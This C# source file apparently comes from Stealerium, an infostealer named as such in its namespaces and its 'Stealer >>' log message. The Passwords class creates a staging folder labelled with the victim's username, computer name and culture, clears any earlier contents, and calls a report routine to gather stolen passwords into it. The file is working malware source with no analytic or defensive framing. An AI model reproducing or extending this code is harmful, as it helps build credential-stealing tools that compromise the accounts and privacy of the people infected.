using System;
using System.IO;
using Stealerium.Helpers;
using Stealerium.Target.System;

namespace Stealerium.Target;

internal sealed class Passwords
{
	private static readonly string PasswordsStoreDirectory = Path.Combine(Paths.InitWorkDir(), SystemInfo.Username + "@" + SystemInfo.Compname + "_" + SystemInfo.Culture);

	public static string Save()
	{
		Console.WriteLine("Running passwords recovery...");
		if (!Directory.Exists(PasswordsStoreDirectory))
		{
			Directory.CreateDirectory(PasswordsStoreDirectory);
		}
		else
		{
			try
			{
				Filemanager.RecursiveDelete(PasswordsStoreDirectory);
			}
			catch
			{
				Logging.Log("Stealer >> Failed recursive remove directory with passwords");
			}
		}
		if (!Report.CreateReport(PasswordsStoreDirectory))
		{
			return "";
		}
		return PasswordsStoreDirectory;
	}
}
